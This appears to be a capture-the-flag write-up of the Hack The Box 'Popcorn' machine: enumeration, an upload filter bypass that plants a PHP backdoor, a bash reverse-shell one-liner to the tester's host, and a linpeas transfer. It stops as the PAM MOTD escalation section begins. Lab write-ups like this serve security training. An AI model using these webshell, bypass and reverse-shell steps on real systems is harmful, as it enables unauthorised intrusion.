---
title: "Hack The Box: Popcorn"
date: 2026-08-05
ref: WU-004
summary: "Rooting the retired HTB 'Popcorn' machine — enumerating a torrent hosting web application, bypassing file upload filters to deploy a PHP webshell, gaining initial access as www-data, and escalating to root via two local privilege escalation paths: the PAM MOTD vulnerability and the Dirty Cow kernel exploit."
tags: [hack-the-box, web, php, file-upload, filter-bypass, apache, linux, privilege-escalation, cve-2010-0832, cve-2016-5195, motd, dirtycow]
---

# Popcorn — Hack The Box Write-up

## Description

**Popcorn** is a medium-rated Linux machine on Hack The Box that focuses heavily on web exploitation. The attack path involves directory enumeration to discover a torrent hosting application, bypassing file type filters to upload a PHP webshell and gain initial access as `www-data`, and then escalating to root via a local privilege escalation vulnerability in the Linux PAM MOTD subsystem.

**Retired machine — `popcorn.htb`**

- **IP Address:** 10.129.44.104
- **Operating System:** Ubuntu 9.10 (Karmic Koala)
- **Architecture:** x86
- **Kernel:** 2.6.31-14-generic-pae

**Credentials:** None 

**Nmap**

```NMAP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 17:42 EDT
Nmap scan report for 10.129.44.104
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-title: Did not follow redirect to http://popcorn.htb/
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```

**Quick Services:**

| Port | Service              |
| ---- | -------------------- |
| 22   | SSH (OpenSSH 5.1p1)  |
| 80   | HTTP (Apache 2.2.12) |

**Completion Status:**

- Root Flag: [Yes]
- User Flag: [Yes]
- Completion: [Complete] (100%)

---

### Enumeration

New machine, same Nmap scan as our previous walkthrough. Right out of the gate, we can see some interesting information about the machine. The output has been shortened to only show the important details, and we already get an answer to one of the guided mode questions. From the scan, we can see two ports open.

Both SSH on port 22 and HTTP on port 80 are open. We currently have no credentials available for SSH, and brute forcing is incredibly noisy and should be considered a last resort. This leaves us with HTTP, and we can already see a hostname for the machine: `http://popcorn.htb`. With this information, we can see that inspecting port 80 is the correct next move.

```NMAP
nmap -sCV -oA Scans/Nmap-Service+Version 10.129.44.104

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-title: Did not follow redirect to http://popcorn.htb/ <-- Hostname
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

---

### HTTP (Port 80)

We already have a hint that the machine might be using virtual hosting. The common-sense approach here is to edit our `/etc/hosts` file so we can reach the machine correctly if this is the case.

At this point, it makes more sense to explore the service manually before attempting to probe it with tools or search for exploits. This is because we do not yet have a full picture of what is being hosted on the machine.

To edit the hosts file, we will need root permissions. As such, we use `sudo` and `nano` as it is a quick and easy command-line editor. Once opened, we can insert the IP address and hostname at the bottom of the file. This allows us to map the hostname to the box's corresponding IP address if the machine is using virtual hosting.
```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ sudo nano /etc/hosts                                  
[sudo] password for kali: 

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ cat /etc/hosts                                                                                                  
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.44.104   popcorn.htb
```

To avoid glossing over anything, we can first check whether anything is being hosted on `http://10.129.44.104`. For this purpose, we will use the `curl` command to validate our findings.

The HTTP response shows us that our suspicions were correct; there is nothing being hosted here, and the server returns a 301 status code.
``` HTML
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ curl http://10.129.44.104
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://popcorn.htb/">here</a>.</p>
<hr>
<address>Apache/2.2.12 (Ubuntu) Server at 10.129.44.104 Port 80</address>
</body></html>

```


> **Note — Virtual Hosting and the Hosts File**
> 
> Virtual hosting is a method that allows a single physical server to run multiple, separate websites or domains. It saves money and hardware space by letting different sites share one powerful computer. 
> 
> The `/etc/hosts` file is a plain text operating system file that maps hostnames and domain names to IP addresses. It acts as a local, manual phone book for your computer, overriding external Domain Name System (DNS) lookups
> 
> We update the hosts file so our machine knows to resolve `popcorn.htb` to the box's IP, then Apache (or nginx, IIS etc.) on the target reads the `Host:` header in our HTTP request and uses that to decide which site to serve. Same IP, different content depending on what hostname we specify.

Now let's try that same approach again, this time using the URL `http://popcorn.htb` instead. From the results, we can see that we land on an Apache default webpage displaying "It works!".

This is a good start, but it does not provide us with any additional attack surface yet.
``` HTML
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ curl http://popcorn.htb  
<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>
```


---

### Directory Enumeration

We suspect there might be other directories hiding useful content. The next logical move is to use content discovery tools, and we can select our preferred directory brute-forcing tool. This time, we decide to use Gobuster and deploy its directory brute-forcing module with the `dir` flag. We will also use the `directory-list-lowercase-2.3-medium.txt` DirBuster wordlist.

Scanning the machine returns three interesting results. First is `/test`, which returns an HTTP 200 "OK" response. We can explore this next, as it appears interesting and we know it is reachable. Next is `/rename`, which provides an HTTP 301 "Moved Permanently" response but is still worth a quick check. Finally, there is `/torrent`, which also provides a 301 response. This gives us our second answer in "Guided Mode" and is likely where we need to investigate further.
```Bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ gobuster dir -u http://popcorn.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47367]
/torrent <-- Task 2   (Status: 301) [Size: 312] [--> http://popcorn.htb/torrent/]
/rename               (Status: 301) [Size: 311] [--> http://popcorn.htb/rename/]
Progress: 92611 / 207641 (44.60%)[ERROR] error on word server-status: timeout occurred during the request
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```


Using Firefox, we load the URL `http://popcorn.htb/test` and see that it contains a PHP information page. This contains a large amount of useful information that not only provides details about the PHP version and file structure, but also specifies whether URL includes and file uploads are possible. In this case, we can see that file uploads are enabled, and we can save this as a valuable finding.
![Directory PHPInfo]({{ '/assets/img/htb-popcorn/Popcorn_Directory_PHPInfo.png' | relative_url }})

**Green — Very Possible Attack Vectors**
* `disable_functions = no value` — no PHP functions are blocked, meaning `system()`, `exec()`, `shell_exec()` and friends are all fully available. if we get a file uploaded and executing, the webshell will work without restriction.
* `file_uploads = On` — the server accepts file uploads. This is promising information that we might be able to exploit.

**Orange — Useful Intelligence**
* `allow_url_fopen = On` — PHP can fetch remote URLs via file functions. Not directly exploitable here given `allow_url_include` is off, but useful context if we find a file read vulnerability later.
* `display_errors = On` — errors print to the browser rather than being logged silently. Helps us during exploitation if something fails — the server will tell us why rather than returning a blank page.
* `expose_php = On` — PHP version is being advertised in response headers. Useful for fingerprinting and identifying version-specific vulnerabilities.

**Red — Attack Path Closed**
* `allow_url_include = Off` — Remote File Inclusion is blocked. PHP will not fetch and execute remote code via include functions, so LFI-to-RFI escalation and direct RFI attacks are off the table.

Scrolling further down the `phpinfo` output reveals the "mime_magic" section, which shows that mime_magic support is disabled due to an invalid magic file. This is a notable finding, as the mime_magic extension is responsible for inspecting the actual byte content of uploaded files to help verify their true type, independently of what the client claims.

With it disabled, PHP would have reduced ability to perform server-side content inspection on uploads.

At this stage, we have not confirmed any upload functionality. However, this suggests that if an upload feature exists, the server may rely more heavily on client-supplied information, such as the `Content-Type` header, rather than validating the file contents itself. This is a condition that can sometimes be bypassed by intercepting and modifying requests, for example using Burp Suite.
![Directory MimeMagic]({{ '/assets/img/htb-popcorn/Popcorn_Directory_MimeMagic.png' | relative_url }})

We do attempt to enumerate `/rename` and discover that it appears to be some kind of API for renaming files on the machine. However, at this point we are not aware of any files that could be renamed, and it seems like a poor use of time to fuzz this functionality.

Our gut feeling is that this is something worth keeping in our back pocket, and we may or may not return to it later. The only clue it gives us at this stage is that uploaded files might be renamed after upload, possibly as an attempt to obfuscate them.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ curl http://popcorn.htb/rename/
Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name 
```

---

### Torrent Hoster

Navigating to `/torrent`, we are greeted by a "Torrent Hoster" web application. What immediately stands out is that it has an upload function that we might be able to abuse to achieve Remote Code Execution (RCE). Before jumping straight in, we should first take some time to enumerate the web application.

We start by checking the page's source and attempt to fingerprint the application. We do not find an exact version, but we can see that it is very old and carries a 2007 copyright notice. This information may help us identify known vulnerabilities or publicly available exploits later.

```HTML
</table>
<br /><br />
</div>
</td></tr>
    <tr>
        <td bgcolor="white" valign="bottom" width="100%" height="100%" style="border-width:0px; border-color:rgb(204,204,204); border-style:solid;">

<div id="footer"><p>Rendertime: 0.007<br></p><font color="#3589E3"><p>Copyright © 2007 TorrentHoster.com. All rights reserved.<br>Powered by <a href="http://www.myanmartorrents.com/" target="_blank">Torrent Hoster.</p></font></div>
    </td>
    </tr>
</table>
```

Checking the upload function, we can see that it appears to be locked behind a login page. In this case, we will need to create an account. We click Sign Up and register using fictitious details.

The registration is successful and confirms that the account has been created. We then navigate back to the upload page, where we are prompted to log in. Using the credentials we just created, we successfully authenticate.
![Torrent LogIn]({{ '/assets/img/htb-popcorn/Popcorn_Torrent_LogIn.png' | relative_url }})

Something of interest is that we can see a Kali Linux torrent file that has previously been uploaded. This is likely some kind of hint from the author, and they may be suggesting that our Kali Linux distribution contains a resource that could help us.
![Torrent OtherUpload]({{ '/assets/img/htb-popcorn/Popcorn_Torrent_OtherUpload.png' | relative_url }})


Using `searchsploit`, we perform a quick search for `torrent hoster`. This returns only one result, which is worth exploring. We can view the exploit information using the `-x` flag and decide whether it is useful.
``` Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ searchsploit torrent hoster
-----------------------------------------------------------------------------------
Exploit Title                                          |  Path
-----------------------------------------------------------------------------------
Torrent Hoster - Remount Upload                        | php/webapps/11746.txt
-----------------------------------------------------------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ searchsploit -x php/webapps/11746.txt        
  Exploit: Torrent Hoster - Remount Upload
      URL: https://www.exploit-db.com/exploits/11746
     Path: /usr/share/exploitdb/exploits/php/webapps/11746.txt
    Codes: N/A
 Verified: False
File Type: HTML document, ASCII text

==================================================================================
| # Title    : Torrent Hoster Remont Upload Exploit
| # Author   : El-Kahina
| # Home     : www.h4kz.com                                                        
| # Script   : Powered by Torrent Hoster.
| # Tested on: windows SP2 Fran&#65533;ais V.(Pnx2 2.0) + Lunix Fran&#65533;ais v.(9.4 Ubuntu)
| # Bug      : Upload
=========================== Exploit By El-Kahina =================================
 # Exploit  :

 1 - use tamper data :

 http://127.0.0.1/torrenthoster//torrents.php?mode=upload

 2-
    <center>
   Powered by Torrent Hoster
        <br />
        <form enctype="multipart/form-data" action="http://127.0.0.1/torrenthoster/upload.php" id="form" method="post" onsubmit="a=document.getElementById('form').style;a.display='none';b=document.getElementById('part2').style;b.display='inline';" style="display: inline
;">
        <strong>&#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; &#65533;&#65533; &#65533;&#65533;:</strong> <?php echo $maxfilesize; ?>&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;<br />
<br>
        <input type="file" name="upfile" size="50" /><br />
<input type="submit" value="&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;" id="upload" />
        </form>
        <div id="part2" style="display: none;">&#65533;&#65533;&#65533; &#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533; .. &#65533;&#65533; &#65533;&#65533;&#65533;&#65533; &#65533;&#65533;&#65533;&#65533;&#65533;</div>
        </center>

3 - http://127.0.0.1/torrenthoster/torrents/  (to find shell)

4 - Xss:

http://127.0.0.1/torrenthoster/users/forgot_password.php/>"><ScRiPt>alert(00213771818860)</ScRiPt>

==========================================
Greetz : Exploit-db Team
all my friend :(Dz-Ghost Team )
im indoushka's sister
------------------------------------------
```


The exploit details certainly seem to follow the URL pathing, and we can visit `https://www.exploit-db.com/exploits/11746` to review the exploit. We can see that it was disclosed on 2010-03-15, meaning it is very likely applicable to our version.
![Torrent 2010]({{ '/assets/img/htb-popcorn/Popcorn_Torrent_2010.png' | relative_url }})

We attempt to follow the exploit and navigate to `http://popcorn.htb/torrent/torrents.php?mode=upload` in order to test uploading a file. At this point, we try a few different file types but fail to upload anything, leaving us to experiment for a while.

We then circle back to enumeration and remember the clue from earlier: the author uploaded a Kali Linux torrent file to the machine, so perhaps we should investigate that first.

This proves to be fruitful, as we find another possible hint from the author. The file's image appears to contain some kind of clue related to escalation. We also know that if the creator was able to upload this file, we should be able to perform a similar action.
![Torrent AdminUpload]({{ '/assets/img/htb-popcorn/Popcorn_Torrent_AdminUpload.png' | relative_url }})


We download a latest copy of the [Kali Torrent](https://cdimage.kali.org/kali-2026.2/kali-linux-2026.2-installer-amd64.iso.torrent) file and attempt to upload the torrent seed file to the application. This proves to be successful, and we now have a file placed on the machine. The next step is to locate where the file was placed.
![Torrent NewUpload]({{ '/assets/img/htb-popcorn/Popcorn_Torrent_NewUpload.png' | relative_url }})


Editing our previous Gobuster scan by changing the URL to one directory higher within the `/torrent` folder gives us plenty to investigate. We can now spend some time attempting to understand the application's structure. The obvious result that immediately stands out is the `/upload` folder.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ gobuster dir -u http://popcorn.htb/torrent -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb/torrent
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 11406]
/download             (Status: 200) [Size: 0]
/rss                  (Status: 200) [Size: 1728]
/login                (Status: 200) [Size: 8412]
/templates            (Status: 301) [Size: 322] [--> http://popcorn.htb/torrent/templates/]
/users                (Status: 301) [Size: 318] [--> http://popcorn.htb/torrent/users/]
/admin                (Status: 301) [Size: 318] [--> http://popcorn.htb/torrent/admin/]
/health               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/health/]
/browse               (Status: 200) [Size: 9320]
/images               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/images/]
/comment              (Status: 200) [Size: 936]
/upload               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/upload/]
/css                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/css/]
/edit                 (Status: 200) [Size: 0]
/lib                  (Status: 301) [Size: 316] [--> http://popcorn.htb/torrent/lib/]
/database             (Status: 301) [Size: 321] [--> http://popcorn.htb/torrent/database/]
/secure               (Status: 200) [Size: 4]
/readme               (Status: 301) [Size: 319] [--> http://popcorn.htb/torrent/readme/]
/js                   (Status: 301) [Size: 315] [--> http://popcorn.htb/torrent/js/]
/logout               (Status: 200) [Size: 183]
/preview              (Status: 200) [Size: 28104]
/config               (Status: 200) [Size: 0]
/thumbnail            (Status: 200) [Size: 1789]
/torrents             (Status: 301) [Size: 321] [--> http://popcorn.htb/torrent/torrents/]
/validator            (Status: 200) [Size: 0]
/hide                 (Status: 200) [Size: 3765]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```

After spending some time enumerating the results, we check the `/upload` folder and see the previously discovered image from the original Kali Linux seed torrent file, as shown in the attached screenshot. This gives us some valuable clues before we move on to attempting exploitation.

1. We now know where the screenshot images for the torrent files are stored. If we can upload some kind of shell here, we may be able to access it and achieve RCE.
2. The files appear to be renamed to a random string, possibly based on the file hash. This may tie into the `/rename` API endpoint we discovered earlier.
3. The author appears to be hinting that this is related to some form of escalation, and we should attempt to exploit the torrent screenshot functionality rather than the torrent upload itself.

![Torrent Esculate]({{ '/assets/img/htb-popcorn/Popcorn_Torrent_Esculate.png' | relative_url }})


---

### File Upload Filter Bypass

With our enumeration work revealing a possible vulnerability that we can now exploit, we will open Burp Suite and attempt to not only capture traffic and verify uploads, but also tamper with requests in order to gain a shell on the machine.

Let's start simple and update the screenshot of the torrent file we uploaded earlier. We will use a test image called `TestHippo.png` that we found to be most suitable given the situation. We will monitor the requests in Burp Suite passively first and then attempt to upload a shell next.
![Bypass UploadPNG]({{ '/assets/img/htb-popcorn/Popcorn_Bypass_UploadPNG.png' | relative_url }})

The captured request gives us some useful information that we can use. It shows the file being uploaded, and within the request, it provides the MIME type of the file. When we inspected the PHP configuration earlier, we identified that if filtering was enabled only client-side, we might be able to tamper with the request and trick the application, as no server-side validation appears to be taking place.
![Bypass RequestPNG]({{ '/assets/img/htb-popcorn/Popcorn_Bypass_RequestPNG.png' | relative_url }})


The PUT request successfully updates the torrent screenshot, confirming that the server accepts file uploads. We can now attempt to upload a PHP web shell to the server. Since the web server is running PHP, we can use `locate` combined with `grep` to search Kali's bundled files for an appropriate PHP web shell and copy it into our working directory.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ locate webshell | grep php 
/usr/share/webshells/php
/usr/share/webshells/php/findsocket
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/qsd-php-backdoor.php
/usr/share/webshells/php/simple-backdoor.php <-- Let try this one first
/usr/share/webshells/php/findsocket/findsock.c
/usr/share/webshells/php/findsocket/php-findsock-shell.php

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ cp /usr/share/webshells/php/simple-backdoor.php shell.php
```

We attempt to upload the web shell in its original form as our first test, but receive an "Invalid File" error. This indicates that the application is performing some level of upload filtering. To understand how the filtering is implemented, we send the request to Repeater and begin modifying different parts of the request to identify what checks are being performed.

For the first modification, we simply rename the file to `webshell.png.php` to test whether the application is only validating the file extension. This does not bypass the filtering, indicating that further request manipulation will be required.

Since we already captured a successful `TestHippo.png` upload request, we can use parts of this request as a reference when modifying our web shell upload. We begin by changing the `Content-Type` header to `image/png`, matching the previously accepted upload request. This also answers Task 3 from the "Guided Mode" section. For additional testing, we copy the magic bytes from the valid image upload into the new request.
![Bypass RequestTamper]({{ '/assets/img/htb-popcorn/Popcorn_Bypass_RequestTamper.png' | relative_url }})

After submitting the tampered request through Burp, we receive an HTTP 200 "OK" response, indicating that the upload was accepted by the application. We can now navigate to `http://popcorn.htb/torrent/upload/83f92aecfa3d92d3df79a5661ad8efb57282b48b.php` to access the uploaded web shell on the server.

We can also confirm that the application has renamed the uploaded file. The new filename appears to be a unique SHA1 hash generated from the upload transaction rather than being based on the original file name or extension.
 ![Bypass Hash]({{ '/assets/img/htb-popcorn/Popcorn_Bypass_Hash.png' | relative_url }})

---

### Initial Access and User Flag

We now have a web shell uploaded to the server, allowing us to execute commands remotely. We can interact with the web shell using `curl`, and our first step is to identify the current user context by executing the `whoami` command. After confirming this, we can upgrade the session so we are no longer restricted to executing a single command per request.

First, we check the current user context and see that we are running as `www-data`, answering Task 4 from the "Guided Mode" section. When interacting with the web shell using `curl`, we also need to include the `--output -` flag. This ensures the raw response is displayed correctly, as the magic bytes added to the beginning of the file are also returned and can interfere with the command output if not handled.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ curl "http://popcorn.htb/torrent/upload/83f92aecfa3d92d3df79a5661ad8efb57282b48b.php?cmd=whoami" --output -
ÿØÿàJFIFÿÛ




,$&1'-=-157:::#+?D?8C49:7



7%%77777777777777777777777777777777777777777777777777ÿ¿¿"ÿÿÄN!1"AQaq#2BR¡r±$3b¢ÁCS²4cÂðDTs£%³ÃáâñÿÄÿÄÿÚ
                                                                                                       ?ít¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(¥(
¥(¥(¥(¥(¥(¥(¥(¥(¥(¥=|(¯ÄÄ|íÉúÐd¥G\¶ÓÆA>B¼öï+îÇ_ÎU*6ùðÔQ2H8uµ#Ô´i_B¸p9'´¨Å÷ObÑ^(Å$äMT|Mìlü_ï¤ý£
h%R¢{à
      Ïî×ß|l}à <ñA*·ÐçÝ9¬

<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>www-data <-- we got access 
</pre> 
```

It is now possible to use this access to upgrade our shell session. We first create a listener using Netcat and then use the `curl` command below to trigger a reverse shell connection back to our machine.

Once the connection is established, we can upgrade the shell into a more interactive PTY session using Python. This provides additional functionality, including job control, which is not available in our current shell environment.
``` bash
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Popcorn/Exploit]
└─$ curl http://popcorn.htb/torrent/upload/83f92aecfa3d92d3df79a5661ad8efb57282b48b.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.62/443 0>&1'"


┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.129.44.104] 46083
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ which python
which python
/usr/bin/python
www-data@popcorn:/var/www/torrent/upload$ python -c 'import pty;pty.spawn("bash")'
<orrent/upload$ python -c 'import pty;pty.spawn("bash")'                     
www-data@popcorn:/var/www/torrent/upload$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can now begin enumerating the machine. One of the first checks we can perform is identifying what users are present on the system. Navigating to the `/home` directory, we find a user named "George". Inside this user's directory, we can see the `user.txt` flag, which we have permission to access.
```Shell
www-data@popcorn:/$ cd /home
cd /home
www-data@popcorn:/home$ ls
ls
george
www-data@popcorn:/home$ cd george
cd george
www-data@popcorn:/home/george$ ls
ls
torrenthoster.zip  user.txt
www-data@popcorn:/home/george$ cat user.txt
cat user.txt
[user flag redacted]
```

---

### Privilege Escalation —  Reconnaissance

With the user flag recovered, we can now begin looking for possible privilege escalation paths. To assist with this process, we will use LinPeas to automate the initial enumeration and highlight potential areas of interest. Once we have reviewed the output, we can manually validate any findings to determine whether they represent viable escalation opportunities.

First, we locate the LinPeas enumeration script and navigate to its location. From here, we can host the file using Python's built-in web server and transfer it to the target machine.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ locate linpeas
/usr/bin/linpeas
/usr/share/peass/linpeas
/usr/share/peass/linpeas/linpeas.sh <-- This one
/usr/share/peass/linpeas/linpeas_darwin_amd64
/usr/share/peass/linpeas/linpeas_darwin_arm64
/usr/share/peass/linpeas/linpeas_fat.sh
/usr/share/peass/linpeas/linpeas_linux_386
/usr/share/peass/linpeas/linpeas_linux_amd64
/usr/share/peass/linpeas/linpeas_linux_arm
/usr/share/peass/linpeas/linpeas_linux_arm64
/usr/share/peass/linpeas/linpeas_small.sh
/usr/share/powershell-empire/empire/server/modules/python/situational_awareness/host/multi/linpeas.yaml

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Popcorn]
└─$ cd /usr/share/peass/linpeas/          

┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

We return to the Popcorn machine and use the `cd` command to navigate to `/dev/shm`. This is a useful location for transferring tools because it is world-writable and stored in temporary memory, meaning its contents are cleared when the machine is restarted.

Once inside the directory, we use `wget` to transfer the LinPeas script onto the machine and then make it executable using the `chmod +x` command. We can now execute the script and begin reviewing the output for potential privilege escalation vectors.
```Shell
www-data@popcorn:/home/george$ cd /dev/shm
cd /dev/shm

www-data@popcorn:/dev/shm$ wget http://10.10.14.62/linpeas.sh
wget http://10.10.14.62/linpeas.sh
--2026-08-04 07:47:35--  http://10.10.14.62/linpeas.sh
Connecting to 10.10.14.62:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 971926 (949K) [application/x-sh]
Saving to: `linpeas.sh'

100%[======================================>] 971,926     1.96M/s   in 0.5s    

2026-08-04 07:47:35 (1.96 MB/s) - `linpeas.sh' saved [971926/971926]

www-data@popcorn:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@popcorn:/dev/shm$ ./linpeas.sh
```


After reviewing the LinPeas output, we identified several potential privilege escalation findings. For this walkthrough, we will focus on PAM MOTD (CVE-2010-0832) and Dirty Cow (CVE-2016-5195), as both are well documented and provide clear exploitation paths that can be followed and validated.
```Shell
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009
Distributor ID: Ubuntu
Description:    Ubuntu 9.10
Release:        9.10
Codename:       karmic


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                    
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Exposure: probable
   Tags: [ ubuntu=9.10|10.04 ]
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed


╔══════════╣ Files inside others home (limit 20)
/home/george/.bash_logout              
/home/george/.bashrc
/home/george/torrenthoster.zip
/home/george/.cache/motd.legal-displayed <-- We missed this earlier
/home/george/.sudo_as_admin_successful
/home/george/user.txt
/home/george/.profile 

╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/g++
/usr/bin/gcc <-- We can compile exploits locally
/usr/bin/make
/bin/nc
/bin/nc.traditional
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.6
/usr/bin/sudo
/usr/bin/wget
```

The LinPeas output contains several other potential privilege escalation avenues that could also be investigated. For this walkthrough, however, we will focus on the two vectors identified above.

We will begin with the PAM MOTD vulnerability, as it presents the lower-risk approach. Kernel exploits such as Dirty Cow have the potential to destabilise or crash the target system. By obtaining root access and recovering the root flag first, we can then return to Dirty Cow afterwards without risking the need to repeat the earlier stages of the walkthrough.

---
### Privilege Escalation — PAM MOTD (CVE-2010-0832)

LinPeas provides a reference to [Exploit Database](https://www.exploit-db.com/exploits/14339) for the **Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation** vulnerability. As this presents a valuable learning opportunity, we will follow our usual approach: examine the published exploit to understand how it works before recreating the technique manually.

> **Note — What is PAM MOTD?**
>
> PAM stands for Pluggable Authentication Modules — it's the Linux authentication framework that sits between applications (like SSH or sudo) and the actual authentication logic. When you log in via SSH, PAM handles the whole process in configurable stages. 
  >
  >MOTD stands for Message of the Day — the welcome banner you see when you log into a Linux system. On Ubuntu, a component called `pam_motd` is responsible for generating and displaying that message at login.

**The Vulnerability**

